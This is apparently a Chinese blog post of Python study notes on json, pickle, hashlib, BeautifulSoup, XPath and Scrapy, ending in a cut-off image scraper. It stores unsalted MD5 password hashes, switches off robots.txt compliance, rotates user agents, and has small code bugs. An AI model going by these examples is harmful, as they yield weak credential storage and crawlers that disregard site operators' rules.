<p><img src="/2020/04/22/python-Common-modules&scrapy/1587043470016.png" alt="1587043470016"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#从文件中反序列化</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'b.txt'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = json.load(f)</span><br><span class="line">    print(res)</span><br><span class="line">    print(type(res))</span><br></pre></td></tr></table></figure>

<h2 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h2><p>将python中所有的数据类型直接转换成字节串—序列化<br>将字节串转换成python中数据类型—反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">bys = pickle.dumps((<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>))</span><br><span class="line">print(type(bys))</span><br><span class="line">print(bys)</span><br><span class="line">res = pickle.loads(bys)</span><br><span class="line">print(type(res))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587093368730.png" alt="1587093368730"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#吧pickle序列化后的内容写入文件中</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'c.txt'</span>,mode=<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">60</span>],f)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#从文件中反序列化</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'c.txt'</span>,mode=<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = pickle.load(f)</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>

<p>pickle常用场景：和json一样，一次写入，一次读取<br>json不是所有的字符串都能序列化，并且不能多次对同一个文件序列化</p>
<h2 id="hashlib"><a href="#hashlib" class="headerlink" title="hashlib"></a>hashlib</h2><p>给一个数据加密的三大步骤</p>
<p>1.获取一个加密对象<br>2.使用加密对象的update进行加密，update方法可以调用多次<br>3.通过hexdigest获取加密结果，或者使用digest(),后者获取的是字节串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment">#获取一个加密对象</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line"><span class="comment">#使用加密对象的update进行加密</span></span><br><span class="line">m.update(<span class="string">'asdds'</span>.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment">#通过hexdigest获取加密结果</span></span><br><span class="line">res = m.hexdigest()</span><br><span class="line">res2 = m.digest()</span><br><span class="line">print(res)</span><br><span class="line">print(res2)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587045300562.png" alt="1587045300562"></p>
<p>例子：注册登录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(username.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    m.update(password.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    <span class="comment">#加密</span></span><br><span class="line">    res = get_md5(username,password)</span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'login'</span>,mode=<span class="string">'at'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(res)</span><br><span class="line">        f.write(‘\n’)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    <span class="comment">#获取当前登录信息的加密结果</span></span><br><span class="line">    res = get_md5(username,password)</span><br><span class="line">    <span class="comment">#读取文件，和其中的数据进行比较</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'login'</span>,mode=<span class="string">'rt'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">if</span> res == line.strip():</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    op = int(input(<span class="string">'1.注册 2.登录 3.退出'</span>))</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        username = input(<span class="string">'请输入用户名'</span>)</span><br><span class="line">        password = input(<span class="string">'请输入密码'</span>)</span><br><span class="line">        register(username,password)</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">2</span>:</span><br><span class="line">        username = input(<span class="string">'请输入用户名'</span>)</span><br><span class="line">        password = input(<span class="string">'请输入密码'</span>)</span><br><span class="line">        res = login(username,password)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            print(<span class="string">'登陆成功'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'登录失败'</span>)</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587047252371.png" alt="1587047252371"></p>
<h2 id="bs4-BeautifulSoup"><a href="#bs4-BeautifulSoup" class="headerlink" title="bs4.BeautifulSoup"></a>bs4.BeautifulSoup</h2><p>导入模块</p>
<blockquote>
<p>from bs4 import BeautifulSoup</p>
<p>#创建一个beautifulsoup对象</p>
<p>soup = BeautifulSoup(html)</p>
</blockquote>
<p>创建 beautifulsoup 对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">res = requests.get(<span class="string">"http://cyzcc.vip"</span>)</span><br><span class="line">html = res.text</span><br><span class="line">soup = BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">print(soup)</span><br></pre></td></tr></table></figure>

<p>我们还可以用本地 HTML 文件来创建对象，例如</p>
<blockquote>
<p>soup = BeautifulSoup(open(‘index.html’),’lxml’)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(open(<span class="string">'index.html'</span>),<span class="string">'lxml'</span>)</span><br><span class="line">print(soup.prettify())</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587087583702.png" alt="1587087583702"></p>
<p>常用方法</p>
<blockquote>
<figure class="highlight golo"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span>(soup.a)</span><br><span class="line">  <span class="comment"># 拿到soup中的第一个a标签</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.a.name)</span><br><span class="line">  <span class="comment"># 获取a标签的名称</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.a.string)</span><br><span class="line">  <span class="comment"># 获取a标签的文本内容</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.a.text)</span><br><span class="line">  <span class="comment"># 获取a标签的文本内容</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.a[<span class="string">"href"</span>])</span><br><span class="line">  <span class="comment"># 获取a标签的href属性的值</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.a.get(<span class="string">"href"</span>))</span><br><span class="line">  <span class="comment"># 查找第一个a标签的href的属性</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.a.attrs)</span><br><span class="line">  <span class="comment"># 获取a标签的所有的属性，返回一个字典</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.<span class="keyword">find</span>(<span class="string">"a"</span>))</span><br><span class="line">  <span class="comment"># 查找第一个a标签</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.find_all(<span class="string">"a"</span>))</span><br><span class="line">  <span class="comment"># 查找所有的a标签</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.find_all(id=<span class="string">"a1"</span>))</span><br><span class="line">  <span class="comment"># 查找所有的的id为a1的标签</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.find_all(class_=<span class="string">"sistex"</span>))</span><br><span class="line">  <span class="comment"># 这里需要注意，如果需要通过class去查找，则需要一个下划线</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">print</span>(soup.find_all([<span class="string">"a"</span>,<span class="string">"p"</span>,<span class="string">"br"</span>]))</span><br><span class="line">  <span class="comment"># 查找所有的啊标签，p标签和br标签</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  soup.<span class="keyword">find</span>(<span class="string">"a"</span>).attrs[<span class="string">"class"</span>] =<span class="string">"2b"</span></span><br><span class="line">  <span class="comment"># 修改某个标签的属性值</span></span><br><span class="line"> </span><br><span class="line">  delsoup.<span class="keyword">find</span>(id=<span class="string">"a1"</span>).attrs[<span class="string">"class"</span>]</span><br><span class="line">  <span class="comment"># 删除某个标签的class属性</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587088448436.png" alt="1587088448436"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到标签内的文本为story的文本内容</span></span><br><span class="line">print(soup.find_all(text=<span class="string">'story'</span>))</span><br><span class="line"><span class="comment"># 找到标签内的文本含有story的文本内容</span></span><br><span class="line">print(soup.find_all(text=re.compile(<span class="string">r'.*?story.*?'</span>)))</span><br></pre></td></tr></table></figure>

<h1 id="XPath表达式"><a href="#XPath表达式" class="headerlink" title="XPath表达式"></a>XPath表达式</h1><p>xpath表达式效率比正则表达式高，但是功能比正则表达式少</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">/   逐层提取</span><br><span class="line"><span class="function"><span class="title">text</span><span class="params">()</span></span>   提取标签下面的文本</span><br><span class="line"><span class="comment">//标签名div	提取所有名为div的标签</span></span><br><span class="line"><span class="comment">//标签名[@属性='属性值']  提取属性为xx的标签</span></span><br><span class="line">@属性名			代表取某个属性值</span><br></pre></td></tr></table></figure>

<p>实例：<br>提取标题</p>
<blockquote>
<p>/html/head/title/text()</p>
</blockquote>
<p>提取所有div标签</p>
<blockquote>
<p>//div</p>
</blockquote>
<p>提取div标签中<code>&lt;div class=&#39;tools&#39;&gt;</code>标签</p>
<blockquote>
<p>div[@class=’tools’]</p>
</blockquote>
<p>在Urllib模块下使用XPath表达式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在Urllib模块下使用XPath表达式</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">data=urllib.request.urlopen(<span class="string">"http://www.baidu.com"</span>).read().decode(<span class="string">"utf-8"</span>,<span class="string">"ignore"</span>)</span><br><span class="line">treedata=etree.HTML(data)</span><br><span class="line">title=treedata.xpath(<span class="string">"//title/text()"</span>)</span><br><span class="line"><span class="keyword">if</span>(str(type(title))==<span class="string">"&lt;class 'list'&gt;"</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    title=[i <span class="keyword">for</span> i <span class="keyword">in</span> title]</span><br><span class="line">print(title[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h1 id="Scrapy框架"><a href="#Scrapy框架" class="headerlink" title="Scrapy框架"></a>Scrapy框架</h1><h2 id="scrapy常用指令"><a href="#scrapy常用指令" class="headerlink" title="scrapy常用指令"></a>scrapy常用指令</h2><p><img src="/2020/04/22/python-Common-modules&scrapy/1587089962889.png" alt="1587089962889"></p>
<h3 id="fetch命令"><a href="#fetch命令" class="headerlink" title="fetch命令"></a>fetch命令</h3><p>　　fetch命令主要用来显示爬虫爬取的过程，如果在scrapy项目目录之外使用该命令，则会调用scrapy默认的爬虫来进行网页的爬取，如果在scrapy的某个项目目录内使用该命令，则会调用该项目中的爬虫来进行网页的爬取</p>
<blockquote>
<p>scrapy fetch <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a></p>
</blockquote>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587346595821.png" alt="1587346595821"></p>
<blockquote>
<p>　　–headers 控制显示对象的爬虫爬取网站的头信息</p>
<p>　　–nolog 控制不显示日志信息</p>
<p>　　–logfile==FILE 存储日志文字信息</p>
<p>　　–spider=SPIDER 控制使用哪个爬虫</p>
<p>　　–loglevel=LEVEL控制日志级别</p>
<p>　　　　日志等级常见值：</p>
<p>　　　　　　CRITICAL 　　发生严重的错误</p>
<p>　　　　　　ERROR 　　   发生了必须立即处理的错误</p>
<p>　　　　　　WARNING        出现一些警告信息</p>
<p>　　　　　　INFO                输出一些提示信息</p>
<p>　　　　　　DEBUG            输出一些调试信息，常用于开发阶段</p>
</blockquote>
<h3 id="runspider命令"><a href="#runspider命令" class="headerlink" title="runspider命令"></a>runspider命令</h3><p>　　可以实现不依托scrapy的爬虫项目，直接运行一个爬虫文件运行独立的爬虫文件</p>
<p>在scrapy里创建一个独立的爬虫文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FirstSpider</span><span class="params">(Spider)</span>:</span></span><br><span class="line">    name = <span class="string">"First"</span></span><br><span class="line">    allowed_domains = [<span class="string">"baidu.com"</span>]  <span class="comment">#允许的域名</span></span><br><span class="line">    start_urls = [<span class="string">"http://www.baidu.com"</span>]   <span class="comment">#开始的网址</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span>  <span class="comment">#定义一个回调函数</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>使用runspider运行：</p>
<blockquote>
<p>scrapy runspider book.py</p>
</blockquote>
<p><img src="/2020/04/22/python-Common-modules&scrapy/../../%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97&&Scrapy.assets/1587352324661.png" alt="1587352324661"></p>
<h3 id="setting命令"><a href="#setting命令" class="headerlink" title="setting命令"></a>setting命令</h3><p>　　查看scrapy对应的配置信息，如果在项目目录内使用，查看的是对应项目的配置信息，如果在项目外使用查看的是scrapy默认配置信息<br>查看设置文件某一项的设置信息：</p>
<blockquote>
<p>scrapy settings –get BOT_NAME</p>
</blockquote>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587352752912.png" alt="1587352752912"></p>
<h3 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h3><p>　　shell命令可以启动scrapy的交互终端，scrapy的交互终端经常在开发以及跳水的时候用到，使用scrapy的交互终端可以实现在不启动scrapy爬虫的情况下，对网站响应进行调试<br><img src="/2020/04/22/python-Common-modules&scrapy/1587354524402.png" alt="1587354524402"></p>
<h3 id="startproject命令"><a href="#startproject命令" class="headerlink" title="startproject命令"></a>startproject命令</h3><p>　　用于创建项目<br>再cmd中输入scrapy startproject firstspider [parm]<img src="/2020/04/22/python-Common-modules&scrapy/1587345780960.png" alt="1587345780960"></p>
<h3 id="version命令"><a href="#version命令" class="headerlink" title="version命令"></a>version命令</h3><p>　　通过version命令可以直接显示scrapy的版本相关信息<br><img src="/2020/04/22/python-Common-modules&scrapy/1587355817193.png" alt="1587355817193"></p>
<h3 id="view命令"><a href="#view命令" class="headerlink" title="view命令"></a>view命令</h3><p>　　实现下载某个网页并用浏览器查看的功能<br><img src="/2020/04/22/python-Common-modules&scrapy/1587355912357.png" alt="1587355912357"></p>
<h3 id="genspider"><a href="#genspider" class="headerlink" title="genspider"></a>genspider</h3><p>创建爬虫文件</p>
<blockquote>
<p>scrapy genspider -l</p>
</blockquote>
<p>查看又那些爬虫模板</p>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587361444742.png" alt="1587361444742"></p>
<p>scrapy genspider -t 模板名  文件名  域名</p>
<blockquote>
<p>scrapy genspider -t basic  firstspider  cyzcc.vip</p>
</blockquote>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587362020076.png" alt="1587362020076"></p>
<h3 id="check"><a href="#check" class="headerlink" title="check"></a>check</h3><p>测试爬虫文件<br>scrapy check firstspider<br><img src="/2020/04/22/python-Common-modules&scrapy/1587362259064.png" alt="1587362259064"></p>
<h3 id="crawl"><a href="#crawl" class="headerlink" title="crawl"></a>crawl</h3><p>运行爬虫文件(项目中的)<br>scrapy check firstspider</p>
<h3 id="–onlog"><a href="#–onlog" class="headerlink" title="–onlog"></a>–onlog</h3><p>不显示日志</p>
<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>查看当前项目下又那些可用的爬虫文件<br>scrapy list<br><img src="/2020/04/22/python-Common-modules&scrapy/1587362414480.png" alt="1587362414480"></p>
<h2 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h2><p>首先从intens.py定义目标，然后运行spiders文件，进入pipelines进行数据处理，然后进行下一次爬取。</p>
<h2 id="爬取当当网商品"><a href="#爬取当当网商品" class="headerlink" title="爬取当当网商品"></a>爬取当当网商品</h2><p>爬取商品名称、链接、评论数<img src="/2020/04/22/python-Common-modules&scrapy/1587364478448.png" alt="1587364478448"></p>
<p>先创建一个爬虫项目</p>
<blockquote>
<p>scrapy startproject dangdang</p>
</blockquote>
<p>然后创建一个爬虫模板</p>
<blockquote>
<p>scrapy genspider -t basic dd dangdang.com</p>
</blockquote>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587369012879.png" alt="1587369012879"></p>
<p>之后定义item.py<br>创建我们需要爬取的东西</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DangdangItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    title = scrapy.Field()  <span class="comment">#存储标题</span></span><br><span class="line">    link = scrapy.Field()   <span class="comment">#存储链接</span></span><br><span class="line">    comment = scrapy.Field() <span class="comment">#存储评论数</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587369204875.png" alt="1587369140655"></p>
<p> 接着编写我们的爬虫文件dangdang.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> dangdang.items <span class="keyword">import</span> DangdangItem <span class="comment">#导入dangdang下面的items.py里面的DangdangItem类</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DdSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">'dd'</span></span><br><span class="line">    allowed_domains = [<span class="string">'dangdang.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://category.dangdang.com/pg5-cid4008123.html'</span>] <span class="comment">#第一页</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span>  <span class="comment">#自动爬取，所有的信息都在response里面</span></span><br><span class="line">        item = DangdangItem()  <span class="comment">#实例化一个类</span></span><br><span class="line">        item[<span class="string">"title"</span>] = response.xpath(<span class="string">"//a[@name='itemlist-title']/@title"</span>).extract() <span class="comment">#从response中通过xpath表达式获取相关信息并且extract解压</span></span><br><span class="line">        item[<span class="string">"link"</span>] = response.xpath(<span class="string">"//a[@name='itemlist-title']/@href"</span>).extract()</span><br><span class="line">        item[<span class="string">"comment"</span>] = response.xpath(<span class="string">"//a[@name='itemlist-review']/text()"</span>).extract()</span><br><span class="line">        <span class="comment">#print(item['link'])</span></span><br><span class="line">        <span class="keyword">yield</span> item  <span class="comment">#将item获得的数据提交到popelines.py</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587392020790.png" alt="1587392020790"></p>
<p>还需要将settings.py的<code>ROBOTSTXT_OBEY = True</code>改为<code>ROBOTSTXT_OBEY = False</code><br>运行一下：</p>
<blockquote>
<p>scrapy crawl dd –nolog</p>
</blockquote>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587392216106.png" alt="1587392216106"></p>
<p>接着处理内容并写入文件中，在pipelines.py中编写，在此之前要在setting中开启</p>
<p>pipelines.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DangdangPipeline</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(item[<span class="string">"title"</span>])):</span><br><span class="line">            title = item[<span class="string">"title"</span>][i]</span><br><span class="line">            link = item[<span class="string">"link"</span>][i]</span><br><span class="line">            comment = item[<span class="string">"comment"</span>][i]</span><br><span class="line">            res = str(i)+<span class="string">":"</span>+title+<span class="string">":"</span>+link+<span class="string">":"</span>+comment</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">"C:\\Users\\华硕\\Desktop\\dangdang.txt"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">                    file_object.write(res + <span class="string">"\n"</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:        <span class="comment">#使用异常处理</span></span><br><span class="line">                print(err)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587394691297.png" alt="1587394691297"></p>
<p>最后处理多页<br>在dd.py里面编写：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> dangdang.items <span class="keyword">import</span> DangdangItem <span class="comment">#导入dangdang下面的items.py里面的DangdangItem类</span></span><br><span class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> Request     <span class="comment">#导入scrapy下的request模块</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DdSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">'dd'</span></span><br><span class="line">    allowed_domains = [<span class="string">'dangdang.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://category.dangdang.com/pg5-cid4008123.html'</span>] <span class="comment">#第一页</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span>  <span class="comment">#自动爬取，所有的信息都在response里面</span></span><br><span class="line">        item = DangdangItem()  <span class="comment">#实例化一个类</span></span><br><span class="line">        item[<span class="string">"title"</span>] = response.xpath(<span class="string">"//a[@name='itemlist-title']/@title"</span>).extract() <span class="comment">#从response中通过xpath表达式获取相关信息并且extract解压</span></span><br><span class="line">        item[<span class="string">"link"</span>] = response.xpath(<span class="string">"//a[@name='itemlist-title']/@href"</span>).extract()</span><br><span class="line">        item[<span class="string">"comment"</span>] = response.xpath(<span class="string">"//a[@name='itemlist-review']/text()"</span>).extract()</span><br><span class="line">        <span class="comment">#print(item['link'])</span></span><br><span class="line">        <span class="keyword">yield</span> item  <span class="comment">#将item获得的数据提交到popelines.py</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">81</span>):</span><br><span class="line">            url = <span class="string">"http://category.dangdang.com/pg"</span>+str(i)+<span class="string">"-cid4008123.html"</span> <span class="comment">#构造url</span></span><br><span class="line">            <span class="keyword">yield</span> Request(url,callback=self.parse)     <span class="comment">#使用yield返回,并设置url和回调函数</span></span><br></pre></td></tr></table></figure>

<p>最后在运行</p>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587396149614.png" alt="1587396149614"></p>
<h1 id="用户代理池构建"><a href="#用户代理池构建" class="headerlink" title="用户代理池构建"></a>用户代理池构建</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用户代理池的构建</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">uapools = [</span><br><span class="line">        <span class="string">"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)"</span>,</span><br><span class="line">        <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"</span></span><br><span class="line">    ]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ua</span><span class="params">(uapools)</span>:</span></span><br><span class="line">    thisua = random.choice(uapools)</span><br><span class="line">    print(thisua)</span><br><span class="line">    headers = (<span class="string">"User-Agent"</span>,thisua)</span><br><span class="line">    opener = urllib.request.build_opener()</span><br><span class="line">    opener.addheaders=[header]</span><br><span class="line">    <span class="comment">#安装为全局</span></span><br><span class="line">    urllib.request.install_opener(opener)</span><br><span class="line">    <span class="comment">#在使用的时候直接调用ua(uapools)即可</span></span><br></pre></td></tr></table></figure>

<h2 id="使用代理池爬取糗事百科搞笑图片"><a href="#使用代理池爬取糗事百科搞笑图片" class="headerlink" title="使用代理池爬取糗事百科搞笑图片"></a>使用代理池爬取糗事百科搞笑图片</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用户代理池的构建</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">uapools = [</span><br><span class="line">        <span class="string">"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)"</span>,</span><br><span class="line">        <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"</span></span><br><span class="line">    ]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ua</span><span class="params">(uapools)</span>:</span></span><br><span class="line">    thisua = random.choice(uapools)</span><br><span class="line">    print(thisua)</span><br><span class="line">    headers = (<span class="string">"User-Agent"</span>,thisua)</span><br><span class="line">    opener = urllib.request.build_opener()</span><br><span class="line">    opener.addheaders=[headers]</span><br><span class="line">    <span class="comment">#安装为全局</span></span><br><span class="line">    urllib.request.install_opener(opener)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">    ua(uapools)</span><br><span class="line">    url= <span class="string">"https://www.qiushibaike.com/imgrank/page/"</span>+str(i)+<span class="string">"/"</span></span><br><span class="line">    res = requests.get(url = url).text</span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    <span class="comment">#print(url)</span></span><br><span class="line">    pat = <span class="string">'&lt;img src="(.*?)" alt='</span></span><br><span class="line">    result=re.compile(pat).findall(res)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(result)):</span><br><span class="line">        imgurl = <span class="string">"https:"</span>+result[j]</span><br><span class="line">        print(imgurl)</span><br><span class="line">        downloadimg = requests.get(imgurl)</span><br><span class="line">        <span class="comment">#下载图片</span></span><br><span class="line">        dir = <span class="string">'C:\\Users\\华硕\\PycharmProjects\\python\\picture\\gaoxiao\\'</span>+str(i)+<span class="string">"_"</span>+str(j)+<span class="string">'.jpg'</span></span><br><span class="line">        <span class="keyword">with</span> open(dir,<span class="string">'wb'</span>) <span class="keyword">as</span> 